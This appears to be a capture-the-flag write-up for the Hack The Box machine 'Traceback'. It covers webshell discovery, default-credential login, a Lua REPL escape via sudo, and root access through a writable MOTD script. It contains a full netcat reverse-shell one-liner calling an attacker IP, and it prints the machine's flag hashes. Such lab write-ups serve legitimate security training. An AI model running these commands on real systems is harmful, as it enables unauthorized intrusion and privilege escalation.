# Summary
- User: left-over webshell and luvit (lua repl) escape
- Root: writable MOTD script executed by root whenever user logs on

# Details
### User: c8807f92936887bec15c899190c52fa6
- Nmap scan reveals ports 22 and 80 are open
- website on port 80 reveals that it has been hacked and defaced
- HTML comment on the site says `Some of the best web shells that you might need ;)`
- Googling comment leads to a Github repository with a list of webshells
    - https://github.com/TheBinitGhimire/Web-Shells
- appending name of each webshell to the site URL eventually leads to `http://traceback.htb/smevk.php` which returns a webshell login page
- default login of `username: admin` and `password: admin` (listed in webshell sourceode on Github) gives webshell access
- webshell gives access as user `webadmin`, allowing the addition of an SSH public key to `/home/webadmin/.ssh/authorized_keys`
- SSHing in shows `note.txt` in the home directory, with a note from `sysadmin` about a "tool to practice lua"
- home directory also contains `.luvit_history` file
- `sudo -l` reveals `webadmin` can run `/home/sysadmin/luvit` as `sysadmin`
- executing `sudo -u sysadmin /home/sysadmin/luvit` spawns a lua repl that can be escaped with `os.execute("/bin/sh")`, giving shell access as `sysadmin` and allowing the user flag to be read
    - https://gtfobins.github.io/gtfobins/lua/

### Root: 9b62e17b71d30d301e9dc5b9ec359afc
- can now add SSH key to `/home/sysadmin/.ssh/authorized_keys` to allow direct access as `sysadmin` or run `/bin/bash` to upgrade to bash shell
- `pspy64` shows a cronjob routinely copies files from `/var/backups/.update-motd.d` to `/etc/update-motd.d`
- `/etc/update-motd.d` holds scripts that are executed by `root` when a user logs in, which can be seen by monitoring `pspy64` during SSH log in
- `sysadmin` has write access to `/etc/update-motd.d` (due to `admins` group rights) and can add a reverse shell command to one of the motd scripts to be executed by `root` on log in
- add `rm -f /tmp/neko; mkfifo /tmp/neko; nc 10.10.14.41 9405 0</tmp/neko | /bin/bash -i 2>&1 | tee /tmp/neko` to `/etc/update-motd.d/80-esm`, setup a reverse listener on local machine with `nc -lvp 9405`, and then trigger the script by SSHing into the target to achieve root access
    - reverse shell works with BSD version of netcat that doesn't provide an option to execute a program on connection
